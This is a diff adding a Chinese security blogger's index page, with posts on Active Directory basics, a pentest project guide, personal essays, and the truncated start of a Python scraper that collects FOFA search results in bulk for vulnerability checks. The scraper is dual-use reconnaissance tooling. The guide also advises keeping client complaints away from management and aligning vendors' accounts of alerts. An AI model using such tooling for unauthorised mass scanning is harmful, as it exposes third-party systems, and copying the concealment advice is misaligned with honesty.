@@ -227,6 +227,622 @@
             
 
   
+    <article id="post-大概是孤独" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">大概是孤独</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/" class="archive-article-date">
+        <time datetime="2021-10-07T11:37:00.876Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>写了好多，删了又删，或许人都有矫情的时候吧，又或许还没有坚强到轻易让别人看穿自己软弱的地步。</p>
+<p>生活本就是自扫庭前雪，自己去污秽。</p>
+<p>说到底还是闲的</p>
+<p>记得专攻术业，好好生活，先自爱，再爱人。共勉。</p>
+<p><img src="https://i.loli.net/2021/10/07/ZqEaWUsCwrlnIxi.jpg" alt="微信图片_20211007193606"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-内网基础：" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h2><p>1、<strong>工作组：</strong>工作组内所有计算机是对等的。工作组不能集中管理。</p>
+<p>2、<strong>域：</strong>域可以说是工作组的升级，域内的安全管理控制机制更加严格，用户需要访问域需要有合法的身份登录才行，之后才能访问域内资源。用户在域内的身份不同，能访问的资源也不同。</p>
+<p>3、<strong>域控：</strong>域控是域内一台类似管理域内机器的计算机，通俗来说像一个单位的门禁系统。当有用户访问域内资源时，域控会鉴别计算机是否属于这个域。域控是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</p>
+<p>4、**<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282319.html">域环境：</a>**单域、父域、子域、域树、域森林。</p>
+<p>5、<strong>域名服务器：</strong>域名服务器就是DNS，在现实用IP配置也是经常会配置的。实际上域中的计算机是使用DNS来定位域控制器、服务器、网络服务等。所以域的名字就是DNS域的名字。所以在内网渗透中，大多数情况下是通过寻找DNS服务器来定位域控制器的。因为域控制器和DNS服务都配置在同一台机器上！</p>
+<p>6、<strong>活动目录：</strong>AD是域环境中提供目录服务的组件。</p>
+<p>7、<strong>域控制器和活动目录的区别：</strong>把域内的众多资源（计算机、用户、用户组、打印机、共享文件等）分门别类有序的放在一个大的仓库中，并将检索信息整理好以便查找和访问这些资源的一个数据库就是活动目录数据库简称AD库。要实现域环境其实就是要安装AD。如果内网中的一台机器上安装了AD，那么它就成为了域控DC。域控就是安装了活动目录的计算机。</p>
+<p>8、<strong>安全域的划分：</strong>在一个路由器连接的网络中，可以将网络划分为内网、DMZ、以及外网三个区域。这三个区域需要完成不同的任务，因此需要设置不同的访问策略。（ACL）</p>
+<p>9、<strong>域中计算机的分类：</strong></p>
+<ul>
+<li>域控</li>
+<li>成员服务器</li>
+<li>客户机</li>
+<li>独立服务器：独立服务器不在域中，也没有安装活动目录。</li>
+</ul>
+<p>10、<strong>域内权限解读：</strong>A-G-DL-P策略（A:用户账户 G：表示全局组 U：表示通用组 DL：表示域本地组 P：表示资源权限）</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/10/01/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%9A/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全服务项目防坑指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="安全服务项目防坑指南"><a href="#安全服务项目防坑指南" class="headerlink" title="安全服务项目防坑指南"></a>安全服务项目防坑指南</h2><p>为规范安全服务项目实施过程，保证实施质量，提高实施效率，特制定本防坑指南。</p>
+<h3 id="十三个不要"><a href="#十三个不要" class="headerlink" title="十三个不要"></a>十三个不要</h3><ol>
+<li>正式文档或者邮件编写完成后，<strong>自己通读几遍</strong>，检查主题和正文是否规范，相关附件是否准确，正文内容<strong>不要留白或者出现错别字</strong>（包括语句不通顺、客户文字写错等低级错误）</li>
+<li><strong>有问题就提！！！</strong>不要把问题累积到自己身上，处理不了会造成更大的问题。（但是<strong>要注意提问的艺术</strong>，不急的事情自己先搜索或者其它方式了解，如果还是找不到记得带着细节去咨询，要高效提问，不要浪费彼此的时间）</li>
+<li>在正式场合或正式文档里，不要用<strong>应该是、可能是、好像是</strong>这种不确定的答案，<strong>要求准确把信息传递给客户。</strong></li>
+<li>实在不能确定的问题，<strong>不要轻易给客户方做出你没把握或者不确定的承诺</strong>（一定要预估风险、留有余地）可以给客户说需要确认一下，约在什么时间点给他回复。</li>
+<li>不要总是只提出问题，<strong>在提出问题的时候，思考并提出你认为的解决方案</strong>。</li>
+<li><strong>问题遇到了就遇到了，不要害怕或者逃避。没什么大不了。</strong>把它想成是一个好事，要是自己处理好了就牛逼了。</li>
+<li><strong>不要轻易说“不会”，“做不到”，协调周边其它资源帮忙</strong>做也是做到的一种方式。</li>
+<li>对于一些有<strong>争议、复杂、可能被截屏的事情，不要微信文字沟通！！！用电话！！！</strong></li>
+<li>需要别人配合的、非简单事项，<strong>给出大概的时间点</strong>，如（麻烦在xx时间点完成） 尽量不要用“尽快”等词语。一般尽快都不会快。</li>
+<li><strong>不要重复造轮子</strong>，很多文档或者问题思路其实已经有了现成的了，多问一下。</li>
+<li><strong>一个好的问题</strong>可以遵循以下形式进行组织：背景信息–遇到的问题–可能的解决方案–尝试解决之后的效果–想要获得什么样的帮助。</li>
+<li><strong>背景信息尤其重要</strong>，别人能不能理解你的问题，能不能代入到你的场景里给出合理建议，全在你的信息描述里。</li>
+<li><strong>沟通或者汇报不要模模糊糊，思考以下几个方面：</strong></li>
+</ol>
+<ul>
+<li>你想做什么？</li>
+<li>想达到什么结果？</li>
+<li>打算怎么做？</li>
+<li>还有没有更好的方案？</li>
+<li>估计会有什么困难和阻力？</li>
+<li>你打算怎么办？</li>
+<li>有什么需要支持？</li>
+</ul>
+<h3 id="项目实施前"><a href="#项目实施前" class="headerlink" title="项目实施前"></a>项目实施前</h3><ol>
+<li>务必与相关人员（合作伙伴对接人、销售、客户对接人）沟通清楚，了解项目前期实施（如相关售前交流的方案、PPT 等资料）或沟通项目实施的目标、需求、时间、地点、注意事项。</li>
+<li>准备项目实施启动PPT、方案、实施计划表等（依实际情况而定，计划表主要便于客户或合作方知悉项目进度）。</li>
+<li>了解项目要实现的目标，了解每项工作的目的，了解客户对于项目的实际需求。</li>
+<li>通读项目技术规范书（合同里有附带，有时候需要主动向销售索取），充分掌握项目规定工作内容项以及后期验收需要的相关材料。</li>
+</ol>
+<h3 id="项目实施中"><a href="#项目实施中" class="headerlink" title="项目实施中"></a>项目实施中</h3><ul>
+<li><strong>关于沟通</strong></li>
+</ul>
+<ol>
+<li>项目最大的问题是未知风险，首次现场沟通后对关于进度、服务内容范围、客户目标、实施难度等进行预判，对于能与客户、销售沟通部分，先行与客户销售沟通清楚，提出解决方案。不能的地方与领导沟通，提出解决方案。</li>
+<li>影响项目评价最大的两个人：1）客户方领导 2) 销售  所以在项目实施过程中，多和这两个人沟通，了解他们的想法、目的和需求。简单来讲“多沟通、多做事、多装逼”</li>
+<li>项目实施更看重结果和目标，因此项目经理凡是觉得<strong>有利于目标完成</strong>，想提出的需求或者需要领导协调的资源就提出来，是否能落地让领导去判断。</li>
+<li>项目最好的结果是共赢。<strong>客户有收获，我们有收获，销售有收获</strong>（销售站的角度比较高，往往更看重是否能给他带来后续项目的机会，如后续的服务和产品，因此在实施过程中，发现有这样的机会点就可以和销售先沟通，增加好感度）</li>
+<li>对于客户方一些拍脑袋等不合理的决定，你就从技术的角度提出来，是哪方面不合理，然后建议的解决方案是怎么样的，<strong>避免给自己平添很多的麻烦。</strong></li>
+<li><strong>每天预留一点时间跳出繁琐事务，从全局思考</strong>：工作安排是否合理，流程是否需要优化，是否能更好的完成项目目标，否则很容易沉浸于具体工作，造成客户看不到，销售不清楚，自己还搞得很累的实施情况。</li>
+<li>给客户讲的东西，也要具备可落地的操作性，如需要谁在什么时间点做什么达到怎么样的效果。</li>
+<li>尽量把客户对实施的意见仅仅留在现场，在现场和客户沟通清楚意见内容并尽量消除该意见，避免被反馈给销售或者客户领导。</li>
+<li>确信正确的事情需要或需要实施的动作，如果客户或者销售不配合就强硬一点，告知不配合的风险在哪里，实在沟通不了也要把锅甩出去，合理避免风险。</li>
+<li>给客户提供方案，引导客户同意你想实施的方案，但不代替客户做决定。</li>
+<li>遇到突发情况，重要情况第一时间同步给项目经理、销售。</li>
+<li>先目的，后措施，先分类，后解决，先整体，后细节。</li>
+<li>学会深度思考，不要以为客户或者伙伴的需求就一定是真实的需求，弄清楚这个需求背后的原因才是重要的。</li>
+</ol>
+<ul>
+<li><strong>实施中其它注意事项</strong></li>
+</ul>
+<ol>
+<li>分清楚工作内容的层次，优先解决重要的事情、领导关注的事情，不要纠结于某个影响不大的技术细节。</li>
+<li>涉及对重要的信息系统、服务器，尽量我们指导，客户自己或相关责任厂商实施操作。如有必要的情况下，在做操作之前，要向客户对接人、业务对接人确认，尽量在客户方陪同下进行操作，总而言之，一定<strong>尽可能规避我们的风险。</strong></li>
+<li>实施的前几天是关键点：问题、实施难度、效果尽量都放大一些，协调最好的资源，做出较好的效果，实施、文档都干漂亮些，与客户和销售建立信任关系，度过了前期，后期实施过程中就比较方便。</li>
+<li>让客户明白具体要怎么配合，为什么要配合，配合后达到的目的，每个阶段可能要做什么事情，哪些是关键点。</li>
+<li><strong>在项目的实施过程中，什么都确认到具体项，</strong>比如开会的具体时间、具体楼房以及门牌号、具体实际对接人，避免客户有模棱两可的描述，以防真正碰到情况的时候手忙脚乱。</li>
+<li>项目实施期间，在知晓技术规范书中要求的验收材料的前提下，有意识的准备后期验收所需材料，存放于单独文件夹内，并做好分类，避免项目结束准备验收或总结材料时，文件太多、太杂导致难以找到所需文件。</li>
+<li>在编写项目方案，验收报告或者其它文档时，如遇<strong>编写内容比较复杂、耗时较长、文档数量较多的，需要首先确定客户的编写要求，或者先拟定文档模板，与客户确定模板准确性后，再进行剩余文档的编写，</strong>以免造成花了大力气编写的文档在交付时被驳回的情况。</li>
+<li>工作追求完成质量是对客户负责，追求完成度那是对公司负责，追求完善优化是对自己负责。</li>
+</ol>
+<h3 id="渗透项目实施中注意事项"><a href="#渗透项目实施中注意事项" class="headerlink" title="渗透项目实施中注意事项"></a>渗透项目实施中注意事项</h3><ol>
+<li><strong>参与做渗透测试项目的，一定不能用手头客户的出口网络去测，千万不要触碰这条底线，</strong>如不遵守的进行通报、罚款、降薪，情节严重的甚至开除。请大家务必遵守实施规范，不要节外生枝。</li>
+<li>严格按照客户授权的测试时间、测试范围以及规范进行渗透工作，切勿超出规定范围进行测试（如虽不在范围，但可能存在极大漏洞风险，导致可能威胁客户整体网络安全，一定和客户沟通，是否需要对范围外的资产进行测试）</li>
+<li>增删改功能处不能使用自动化工具，如sqlmap,burp自动化插件等。</li>
+<li>生产环境不能进行登录大型扫描，登录扫描会写入大量脏数据。</li>
+<li>Sql 注入，只需要出现数据库名称即可，不能进行数据查看。</li>
+<li>shell 或者命令执行，推荐上传一个文本证明，如纯文本的1.php、1.jsp等证明问题存在即可，禁止下载和读取服务器上任何源代码文件和敏感文件，不要执行删除、写入命令，如果是上传的webshell文件，请写明shell文件地址和连接口令。</li>
+<li>越权增删改，请使用自己的测试账号进行。账号不可注册的情况下，如果获取到该系统的帐密并验证成功，如需进一步安全测试，请咨询客户得到同意后进行测试。</li>
+<li>存储xss漏洞，尽量插入不影响他人的测试payload。</li>
+<li>关于漏洞扫描项目，在实施前先沟通清楚客户有没有监管单位的检查，大概用什么检查，都什么时候检查，我们对症下药（监管机构用什么扫描器我们尽量用什么扫描器），以免我们扫描结果与监管单位扫描结果有出入，从而被客户质疑我们的项目实施能力。</li>
+</ol>
+<h3 id="电网渗透测试注意事项"><a href="#电网渗透测试注意事项" class="headerlink" title="电网渗透测试注意事项"></a>电网渗透测试注意事项</h3><ol>
+<li>在工作时间内不能进行常规扫描任务。</li>
+<li>做过的系统，多发发现、挖掘漏洞，尽量不要让护网的红队，发现在我们做过的系统有较严重的漏洞，如某个中间件能rce，我们没发现，后面被红队发现，国网会进行通报，之后他们会追责。</li>
+<li>尽量不要进行电话之类的口头话，用邮件留下证据，如某个系统发现一个漏洞，厂家直接电话回复，这个系统是旧版本，要下线关停，漏洞无需整改，没有留下有邮件之类的说明，之后被红队发现，通报后，解释很麻烦。</li>
+<li>如果有攻击事件告警牵涉到多家厂商分析，一定要说法一样，不要出现，我说这是误报，你说是真实攻击的情况。</li>
+<li>国网文档部分要求比较严格，文档会有人专门审核，并且最终成果会与合同中的服务内容一一对应。</li>
+<li>国网的漏洞一把内网比较多，在挖掘时多关注内网渗透这方面。</li>
+</ol>
+<h3 id="关于文档"><a href="#关于文档" class="headerlink" title="关于文档"></a>关于文档</h3><ol>
+<li>先列出思路，框架，整体逻辑，对相关数据进行量化；整体思路以及框架整理很重要，这个做好了，后续文档就有据可依，如果这一步没做好，后面写文档的时候就想着稀里糊涂的，极易产生多余的工作量，结果还没做好。</li>
+<li>项目实施过程中，当处理完一个问题或者一件新的东西对其进行总结，依据具体情况形成经验文档。</li>
+<li>写日报等汇报文档，1）写清楚什么原因在什么地方和谁做了什么工作内容，达到了什么正面效果。最好能体现四个方面的能力（技术能力、协调能力、沟通能力、工作态度）2）凡是涉及项目范围、项目内容、项目目标、客户需求等内容均可以写进日报。</li>
+<li>关于其它文档内容（如报告、PPT）要逻辑自洽，清楚自己当前讲的是什么东西，不要被客户问得一问三不知，要考虑到每一个疑问点，并在汇报前就解决掉，不能给自己挖坑。</li>
+<li>重要的不在于细节，重要的在于整体的思路和丰富度，无论是文档还是其它材料，都是如此。</li>
+</ol>
+<h3 id="关于PPT"><a href="#关于PPT" class="headerlink" title="关于PPT"></a>关于PPT</h3><ol>
+<li>和写文档一样，制作PPT（如开工，阶段总结，项目总结，产品介绍，服务介绍等）也是需要先列出思路，框架，整体逻辑，对相关数据进行量化；这些依旧很重要，这个做好了，后续写PPT就有据可循，如果这一步没做好，后面写PPT的时候就想稀里糊涂的，极易产生多余的工作量，结果还做不好。</li>
+<li>写PPT不同与写word文档，需要在每一页PPT里面突出想描述的重点，最大限度精简相关描述，用最简短的话语描述出想表达的意思。</li>
+<li>每页PPT都不能是长篇大论的温习描述，这样对观看着很不友好，也勾不起观看者继续观看下去的欲望，所以每页PPT都需要结合1-2张图片（可多不可少）来进行更直观的描述，<strong>图片比文字更容易让人接受和理解。</strong></li>
+<li>前期尽可能的手机需要的素材，比如相关方案，照片，图片等，编写的时候多在网上寻找模板和需要的素材，但是必须得是结合总体思路和公司惯用的PPT母版元素的，总之就一句话，尽量在总体框架下，丰富PPT里面的内容，多插入图片以及其它素材，使PPT更有美感，让人容易接受，有观看下去的欲望。</li>
+</ol>
+<p>ps:</p>
+<p>ppt模板类网站</p>
+<p><a target="_blank" rel="noopener" href="http://www.tretars.com/">http://www.tretars.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.51pptmoban.com/">http://www.51pptmoban.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.ypppt.com/">http://www.ypppt.com</a></p>
+<p>元素类网站</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.iconfont.cn/">https://www.iconfont.cn</a></strong></p>
+<p>背景类</p>
+<p><a target="_blank" rel="noopener" href="https://www.hituyu.com/">https://www.hituyu.com</a></p>
+<p>公众号</p>
+<p>秋叶PPT</p>
+<h3 id="项目实施后"><a href="#项目实施后" class="headerlink" title="项目实施后"></a>项目实施后</h3><ol>
+<li>项目实施结束后，确定项目相关文件已经销毁或者妥善安全保存，提前告知客户我们具体离场时间，妥善安排好对客户或合作商的离场交接，并告知销售，质量管理人员等相关人员离场事宜。</li>
+<li>总结好此次项目经验，在下一个项目中应用，达到总结经验的目的。</li>
+</ol>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/07/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%98%B2%E5%9D%91%E6%8C%87%E5%8D%97/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-人生苦短、多活几年！" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/">人生苦短、多活几年！</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/" class="archive-article-date">
+        <time datetime="2021-07-08T09:38:56.334Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-08</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>From tomorrow on, I will be a happy man.</p>
+<p>Grooming,chopping and traveling all over the word.</p>
+<p>From tomorrow on, I will care foodstuff and vegetable.</p>
+<p>Living in a house towards the sea, with spring blossoms.</p>
+<p>From tomorrow on, write to each of my dear ones.</p>
+<p>Telling them of my happiness.</p>
+<p>What the lightening of happiness has told me.</p>
+<p>I will spread it to each of them.</p>
+<p>Give a warm name for every river and every mountain.</p>
+<p>Strangers, I will also wish you happy.</p>
+<p>May you have a brilliant future !</p>
+<p>May you lovers eventually becomes spouses !</p>
+<p>May you enjoy happiness in this earthly word !</p>
+<p>I only wish to face the sea, with spring blossoms.</p>
+<p>做个爱自己的人、读书、吃饭、多睡觉，健谈、健体、不油腻。</p>
+    
+    <a class="article-more-a" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">习惯</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-批量采集fofa搜索结果" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/">批量采集fofa搜索结果</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/" class="archive-article-date">
+        <time datetime="2021-06-16T18:35:49.455Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-17</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>今天看到某漏洞爆出，想进行批量采集url进行漏洞验证。奈何网上没有找到现成得脚本，于是自己写了一个采集fofa搜索引擎结果的脚本。具体功能相信各位自己都懂，直接上代码吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @author: kriller</span></span><br><span class="line"><span class="string">  @license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.</span></span><br><span class="line"><span class="string">  @contact: kriller@cumt.edu.cn</span></span><br><span class="line"><span class="string">  @file: fofa.py</span></span><br><span class="line"><span class="string">  @time: 2021/6/17 1:57</span></span><br><span class="line"><span class="string">  @desc:</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaders</span>():</span></span><br><span class="line">  <span class="comment"># 随机ua池</span></span><br><span class="line">  user_agent_list = [</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; &#x27;</span><span class="string">&#x27;x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 